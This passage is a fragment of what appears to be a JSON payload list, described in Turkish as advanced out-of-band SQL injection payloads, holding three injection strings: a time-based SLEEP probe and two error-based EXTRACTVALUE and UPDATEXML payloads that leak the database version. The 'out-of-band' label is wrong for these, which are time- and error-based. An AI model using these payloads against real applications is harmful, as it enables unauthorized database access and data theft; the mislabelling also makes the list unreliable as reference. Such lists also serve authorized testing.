  "out_of_band_advanced_payloads": {
    "desc": "Gelişmiş out-of-band SQL injection payload'ları",
    "examples": [
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) IN (SELECT * FROM (SELECT(SLEEP(5)))b)-- -",
      "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
      "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)-- -",
